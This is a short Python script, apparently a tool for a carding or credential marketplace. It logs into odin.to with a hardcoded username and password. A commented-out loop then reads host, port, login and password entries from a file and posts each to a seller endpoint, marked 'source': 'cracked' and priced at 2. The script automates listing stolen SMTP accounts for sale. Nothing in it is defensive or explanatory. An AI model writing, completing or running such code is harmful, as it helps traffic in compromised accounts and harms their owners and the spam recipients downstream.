import os,re,requests
req = requests.session()

header = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'}

try:
    reqq = req.get('https://odin.to/login', data={'username': 'zizo', 'password': '123456'}, headers=header)
except:
    print("Failed")

"""    
c = 0
for i in open('api.txt', 'r').read().splitlines():
    try:
        i = i.replace('(SSL)', '')
        c += 1
        host = (i.split('|')[0])
        print("[%s]~[%s]" % (c, i))
        port = int(i.split('|')[1])
        usr = i.split('|')[2]
        passwd = i.split('|')[3]
        reqqa = req.post('https://odin.to/seller/smtpAdd', data={'host': host, 'login': usr, 'pass': passwd, 'source': 'cracked', 'port': port, 'price': 2, 'start': 'work'}, timeout=10)
    except:
        pass
"""